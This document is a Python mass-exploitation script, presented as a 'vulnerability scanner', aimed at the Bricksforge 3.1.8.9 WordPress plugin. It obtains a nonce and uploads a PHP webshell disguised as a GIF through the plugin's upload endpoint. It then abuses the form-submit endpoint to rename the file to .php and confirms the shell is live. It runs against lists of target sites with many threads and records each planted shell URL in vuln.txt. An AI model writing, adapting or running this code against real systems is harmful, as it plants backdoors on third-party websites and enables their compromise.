#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
BRICKSFORGE 3.1.8.9 VULNERABILITY SCANNER - FINAL VERSION 2
Non-Interactive, Fully Verbose, Colored Output
"""

import asyncio
import json
import os
import random
import re
import string
import sys
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse

import aiohttp
from rich.console import Console
from rich.progress import (
    BarColumn,
    Progress,
    SpinnerColumn,
    TaskProgressColumn,
    TextColumn,
    TimeRemainingColumn,
)

console = Console()
log_lock = asyncio.Lock()

def generate_random_string(length: int = 12) -> str:
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def create_php_webshell() -> bytes:
    php_payload = '''<?php
if (isset($_POST['upload'])) {
    $target_dir = "./";
    $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "SUCCESS:" . $target_file;
    } else {
        echo "ERROR:UPLOAD_FAILED";
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>File Uploader</title></head>
<body><form method="POST" enctype="multipart/form-data"><input type="file" name="fileToUpload" required><input type="submit" name="upload" value="Upload File"></form></body></html>'''
    gif_bytes = (
        b'\x47\x49\x46\x38\x39\x61'
        b'\x01\x00\x01\x00'
        b'\x80\x00\x00'
        b'\xFF\xFF\xFF'
        b'\x00\x00\x00'
        b'\x2C\x00\x00\x00\x00'
        b'\x01\x00\x01\x00'
        b'\x00'
        b'\x02\x02\x44\x01\x00'
    )
    php_bytes = php_payload.encode('utf-8', errors='ignore')
    trailer = b'\x3B'
    return gif_bytes + php_bytes + trailer

async def test_single_target(
    session: aiohttp.ClientSession,
    target_index: int,
    target_url: str,
    semaphore: asyncio.Semaphore,
    log_buffer: List[Tuple[int, str]],
    total_targets: int
) -> Tuple[bool, Optional[str]]:
    async with semaphore:
        base_url = target_url.rstrip('/')
        nonce = None
        uploaded_info = None
        crafted_shell_url = None
        
        # Log starting
        async with log_lock:
            log_buffer.append((target_index, f"[bold cyan][{target_index}/{total_targets}][*][/bold cyan] [white]{base_url}[/white] [yellow]STARTING SCAN[/yellow]"))
        
        try:
            # Step 1: Nonce
            try:
                ajax_url = urljoin(base_url, '/wp-admin/admin-ajax.php')
                async with session.post(
                    ajax_url,
                    data={'action': 'bricksforge_regenerate_nonce'},
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        text_resp = await resp.text()
                        try:
                            json_data = json.loads(text_resp)
                            if json_data.get('success'):
                                data_obj = json_data.get('data')
                                if isinstance(data_obj, dict) and data_obj.get('nonce'):
                                    nonce = data_obj['nonce']
                                elif json_data.get('nonce'):
                                    nonce = json_data['nonce']
                            if not nonce:
                                m = re.search(r'"nonce"\s*:\s*"([^"]+)"', text_resp)
                                if m:
                                    nonce = m.group(1)
                        except:
                            pass
                if nonce:
                    async with log_lock:
                        log_buffer.append((target_index, f"[bold cyan][{target_index}/{total_targets}][1/4][/bold cyan] [bold green]NONCE ACQUIRED[/bold green] [dim]{nonce[:20]}...[/dim]"))
                else:
                    async with log_lock:
                        log_buffer.append((target_index, f"[bold cyan][{target_index}/{total_targets}][1/4][/bold cyan] [bold yellow]NONCE NOT FOUND[/bold yellow] [dim](attempting without nonce)[/dim]"))
            except Exception as e:
                async with log_lock:
                    log_buffer.append((target_index, f"[bold cyan][{target_index}/{total_targets}][1/4][/bold cyan] [bold red]NONCE ERROR[/bold red]"))
            
            # Step 2: Upload
            try:
                upload_url = urljoin(base_url, '/wp-json/bricksforge/v1/form_file_upload')
                shell_bytes = create_php_webshell()
                filename = f'uploader_{generate_random_string(8)}.gif'
                form_data = aiohttp.FormData()
                form_data.add_field('file', shell_bytes, filename=filename, content_type='image/gif')
                headers = {}
                if nonce:
                    headers['X-WP-Nonce'] = nonce
                async with session.post(
                    upload_url,
                    data=form_data,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=20)
                ) as resp:
                    if resp.status == 200:
                        resp_text = await resp.text()
                        try:
                            json_up = json.loads(resp_text)
                            if json_up.get('success'):
                                data_up = json_up.get('data')
                                if isinstance(data_up, list) and data_up:
                                    uploaded_info = data_up[0]
                                elif isinstance(data_up, dict):
                                    uploaded_info = data_up
                                if uploaded_info and uploaded_info.get('url') and uploaded_info.get('file'):
                                    async with log_lock:
                                        log_buffer.append((target_index, f"[bold cyan][{target_index}/{total_targets}][2/4][/bold cyan] [bold green]UPLOAD SUCCESS[/bold green]"))
                                    # continue
                                else:
                                    async with log_lock:
                                        log_buffer.append((target_index, f"[bold cyan][{target_index}/{total_targets}][2/4][/bold cyan] [bold red]UPLOAD FAILED - MISSING DATA[/bold red]"))
                                    return False, None
                            else:
                                async with log_lock:
                                    log_buffer.append((target_index, f"[bold cyan][{target_index}/{total_targets}][2/4][/bold cyan] [bold red]UPLOAD REJECTED[/bold red]"))
                                return False, None
                        except:
                            async with log_lock:
                                log_buffer.append((target_index, f"[bold cyan][{target_index}/{total_targets}][2/4][/bold cyan] [bold red]UPLOAD INVALID JSON[/bold red]"))
                            return False, None
                    else:
                        async with log_lock:
                            log_buffer.append((target_index, f"[bold cyan][{target_index}/{total_targets}][2/4][/bold cyan] [bold red]UPLOAD FAILED HTTP {resp.status}[/bold red]"))
                        return False, None
            except asyncio.TimeoutError:
                async with log_lock:
                    log_buffer.append((target_index, f"[bold cyan][{target_index}/{total_targets}][2/4][/bold cyan] [bold red]UPLOAD TIMEOUT[/bold red]"))
                return False, None
            except Exception:
                async with log_lock:
                    log_buffer.append((target_index, f"[bold cyan][{target_index}/{total_targets}][2/4][/bold cyan] [bold red]UPLOAD ERROR[/bold red]"))
                return False, None
            
            # Step 3
            try:
                orig_url = uploaded_info['url']
                orig_file = uploaded_info['file']
                orig_name = uploaded_info.get('name', f'shell_{generate_random_string(4)}.gif')
                orig_type = uploaded_info.get('type', 'image/gif')
                orig_size = uploaded_info.get('originalFilesize') or uploaded_info.get('size') or 0
                parsed_orig = urlparse(orig_url)
                crafted_path = parsed_orig.path.replace('.gif', '.php').replace('.GIF', '.php')
                if parsed_orig.query:
                    crafted_shell_url = f"{parsed_orig.scheme}://{parsed_orig.netloc}{crafted_path}?{parsed_orig.query}"
                else:
                    crafted_shell_url = f"{parsed_orig.scheme}://{parsed_orig.netloc}{crafted_path}"
                temp_entry = {
                    'file': {
                        'file': orig_file,
                        'url': crafted_shell_url,
                        'name': orig_name,
                        'originalFilename': orig_name,
                        'originalFilesize': orig_size,
                        'type': orig_type
                    },
                    'field': 'form-field-1'
                }
                temp_json_str = json.dumps([temp_entry], separators=(',', ':'))
                form_payload = {
                    'formId': 'form-1',
                    'postId': '1',
                    'temporaryFileUploads': temp_json_str,
                    'fieldIds': '["1"]'
                }
                headers_submit = {'Content-Type': 'application/x-www-form-urlencoded'}
                if nonce:
                    headers_submit['X-WP-Nonce'] = nonce
                for ep in [urljoin(base_url, '/wp-json/bricksforge/v1/form_submit'), urljoin(base_url, '/wp-json/bricks/v1/form_submit')]:
                    try:
                        async with session.post(ep, data=form_payload, headers=headers_submit, timeout=aiohttp.ClientTimeout(total=40)) as r:
                            await r.read()
                            break
                    except:
                        continue
                async with log_lock:
                    log_buffer.append((target_index, f"[bold cyan][{target_index}/{total_targets}][3/4][/bold cyan] [bold green]FORM SUBMIT SENT[/bold green]"))
            except Exception:
                async with log_lock:
                    log_buffer.append((target_index, f"[bold cyan][{target_index}/{total_targets}][3/4][/bold cyan] [bold red]FORM SUBMIT ERROR[/bold red]"))
                return False, None
            
            # Step 4
            await asyncio.sleep(1.0)
            cand = []
            if crafted_shell_url:
                cand.append(crafted_shell_url)
                pc = urlparse(crafted_shell_url)
                cand.append(f"{pc.scheme}://{pc.netloc}{pc.path}")
            verified = None
            for cu in cand:
                try:
                    async with session.get(cu, timeout=aiohttp.ClientTimeout(total=15), allow_redirects=True) as r:
                        if r.status == 200:
                            b = await r.text()
                            if '<form' in b.lower() and 'filetoupload' in b.lower():
                                verified = cu
                                break
                except:
                    pass
            if verified:
                async with log_lock:
                    log_buffer.append((target_index, f"[bold cyan][{target_index}/{total_targets}][4/4][/bold cyan] [bold green]VERIFICATION SUCCESS[/bold green]"))
                    log_buffer.append((target_index, f"[bold green][{target_index}/{total_targets}]>>> VULNERABLE <<< SHELL: {verified}[/bold green]"))
                return True, verified
            else:
                async with log_lock:
                    log_buffer.append((target_index, f"[bold cyan][{target_index}/{total_targets}][4/4][/bold cyan] [bold red]VERIFICATION FAILED[/bold red]"))
                return False, None
        except Exception as e:
            async with log_lock:
                log_buffer.append((target_index, f"[bold red][{target_index}/{total_targets}][!] EXCEPTION: {str(e)[:50]}[/bold red]"))
            return False, None

async def main():
    try:
        # Read targets from file and threads from args
        targets_file = None
        threads_count = 10
        
        # Try to read from stdin if provided, else prompt
        if len(sys.argv) > 1:
            targets_file = sys.argv[1]
        if len(sys.argv) > 2:
            try:
                threads_count = int(sys.argv[2])
            except:
                threads_count = 10
        
        if not targets_file:
            # try stdin
            try:
                for line in sys.stdin:
                    s = line.rstrip()
                    if not s: continue
                    # first might be file, second threads
                    if targets_file is None and os.path.exists(s):
                        targets_file = s
                    elif targets_file is not None and threads_count is None:
                        try:
                            threads_count = int(s)
                            break
                        except:
                            pass
                    elif targets_file is None:
                        # maybe just path
                        if os.path.exists(s):
                            targets_file = s
            except:
                pass
        
        if not targets_file or not os.path.exists(targets_file):
            console.print("[bold red]ERROR: Targets file not specified or not found[/bold red]")
            return
        
        if threads_count < 1 or threads_count > 500:
            threads_count = 10
        
        # Load targets
        with open(targets_file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        targets_list = []
        for line in lines:
            l = line.strip()
            if not l or l.startswith('#'): continue
            if not l.startswith(('http://','https://')):
                l = 'http://' + l
            targets_list.append(l)
        
        if not targets_list:
            console.print("[bold red]No valid targets[/bold red]")
            return
        
        console.print(f"[bold cyan]BRICKSFORGE 3.1.8.9 VULNERABILITY SCANNER - FINAL V2[/bold cyan]")
        console.print(f"[cyan]Targets: {len(targets_list)} | Threads: {threads_count}[/cyan]")
        console.print(f"[cyan]Vuln output: vuln.txt[/cyan]")
        console.print("-" * 80)
        
        log_buffer = []
        results_map = {}
        
        semaphore = asyncio.Semaphore(threads_count)
        connector = aiohttp.TCPConnector(limit=threads_count * 4, ssl=False, limit_per_host=threads_count)
        timeout = aiohttp.ClientTimeout(total=300)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0'}) as session:
            tasks_list = []
            for i, turl in enumerate(targets_list, 1):
                tasks_list.append(asyncio.create_task(test_single_target(session, i, turl, semaphore, log_buffer, len(targets_list))))
            # Run and collect
            for i, t in enumerate(tasks_list):
                try:
                    v, s = await t
                    results_map[i] = (targets_list[i], v, s)
                except:
                    results_map[i] = (targets_list[i], False, None)
        
        # Write vuln.txt
        vuln_rows = []
        try:
            with open('vuln.txt', 'w', encoding='utf-8') as vf:
                pass
        except:
            pass
        for i in range(len(targets_list)):
            if i in results_map:
                turl_r, vflag, surl = results_map[i]
                if vflag and surl:
                    vuln_rows.append((turl_r, surl))
                    try:
                        with open('vuln.txt', 'a', encoding='utf-8') as vf:
                            vf.write(f"{turl_r} | {surl}\n")
                    except:
                        pass
        
        # Print all logs
        console.print()
        for idx_log, msg_log in sorted(log_buffer):
            console.print(msg_log)
        
        console.print("-" * 80)
        if vuln_rows:
            console.print(f"[bold green]VULNERABLE FOUND: {len(vuln_rows)}[/bold green]")
            for tv, sv in vuln_rows:
                console.print(f"[bold green][+] {tv}[/bold green]")
                console.print(f"[bold yellow]    -> {sv}[/bold yellow]")
            console.print(f"[green]Saved to vuln.txt[/green]")
        else:
            console.print(f"[bold red]NO VULNERABLE TARGETS FOUND[/bold red]")
        console.print(f"[cyan]Total: {len(targets_list)} | Vulnerable: {len(vuln_rows)}[/cyan]")
        
    except KeyboardInterrupt:
        console.print("[red]Interrupted[/red]")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")

if __name__ == '__main__':
    asyncio.run(main())
